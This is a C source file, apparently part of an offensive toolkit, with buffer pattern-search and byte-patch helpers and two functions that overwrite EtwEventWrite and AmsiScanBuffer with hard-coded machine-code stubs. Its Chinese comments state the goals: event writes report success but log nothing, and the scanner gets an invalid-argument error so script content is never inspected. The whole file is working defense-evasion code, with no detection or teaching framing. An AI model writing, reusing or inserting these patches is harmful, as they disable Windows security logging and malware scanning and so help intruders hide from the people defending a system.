#define _DEFAULT_SOURCE
#define _POSIX_C_SOURCE 200809L

#include "defense.h"

#include <string.h>

int df_evade_find(const uint8_t *buf, size_t len, const uint8_t *pat, size_t plen,
                  size_t *out_off)
{
    size_t i;

    if (!buf || !pat) return DF_ERR_ARGS;
    if (plen == 0)    return DF_ERR_ARGS;
    if (len < plen)   return DF_ERR_ARGS;

    for (i = 0; i + plen <= len; i++) {
        /* SEC-CMP:PATTERN: 内存模式/特征扫描，非秘密比较 */
        if (memcmp(buf + i, pat, plen) == 0) {
            if (out_off) *out_off = i;
            return DF_OK;
        }
    }
    return DF_ERR_NOTFOUND;
}

int df_evade_patch_at(uint8_t *buf, size_t len, size_t off,
                      const uint8_t *repl, size_t rlen)
{
    if (!buf || !repl) return DF_ERR_ARGS;
    if (rlen == 0)     return DF_ERR_ARGS;
    if (off > len)     return DF_ERR_RANGE;
    if (len - off < rlen) return DF_ERR_RANGE;

    memcpy(buf + off, repl, rlen);
    return DF_OK;
}

int df_evade_patch_first(uint8_t *buf, size_t len, const uint8_t *pat, size_t plen,
                         const uint8_t *repl, size_t rlen, size_t *out_off)
{
    size_t off = 0;
    int    r;

    r = df_evade_find(buf, len, pat, plen, &off);
    if (r != DF_OK) return r;

    r = df_evade_patch_at(buf, len, off, repl, rlen);
    if (r != DF_OK) return r;

    if (out_off) *out_off = off;
    return DF_OK;
}

/* EtwEventWrite 返回桩：xor eax,eax; ret → 事件写入恒返回成功但不记录 */
static const uint8_t k_etw_stub[]  = { 0x33, 0xc0, 0xc3 };

/* AmsiScanBuffer 返回桩：mov eax,0x80070057(E_INVALIDARG); ret
 * → 扫描器拿到非法参数错误，脚本内容不被检查 */
static const uint8_t k_amsi_stub[] = { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xc3 };

int df_evade_etw(uint8_t *buf, size_t len, size_t off)
{
    return df_evade_patch_at(buf, len, off, k_etw_stub, sizeof k_etw_stub);
}

int df_evade_amsi(uint8_t *buf, size_t len, size_t off)
{
    return df_evade_patch_at(buf, len, off, k_amsi_stub, sizeof k_amsi_stub);
}
